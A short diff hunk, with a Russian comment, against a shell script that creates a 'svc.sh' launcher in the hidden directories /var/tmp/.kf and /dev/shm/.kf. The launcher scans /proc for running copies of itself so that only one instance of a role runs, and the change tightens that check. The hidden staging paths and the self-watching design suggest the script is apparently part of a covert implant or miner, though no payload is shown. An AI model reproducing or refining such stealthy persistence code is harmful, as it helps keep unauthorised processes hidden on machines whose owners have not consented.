@@ -160,7 +160,9 @@ cat > "$D/svc.sh" <<'SV'
 D=/var/tmp/.kf; S=/dev/shm/.kf; R="${1:-m}"
 alm(){ for p in /proc/[0-9]*; do c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline"); case "$c" in *"$1"*) return 0;; esac; done; return 1; }
 for p in /proc/[0-9]*; do pid=${p#/proc/}; [ "$pid" = "$$" ] && continue
-  c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline"); case "$c" in *"$D/svc.sh $R"*) exit 0;; esac
+  c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline")
+  # точное совпадение, а не подстрока: иначе внешний "sh -c ...svc.sh m..." глушит запуск
+  case "$c" in "sh $D/svc.sh $R "*|"$D/svc.sh $R "*) exit 0;; esac
 done
 case "$R" in
 m)
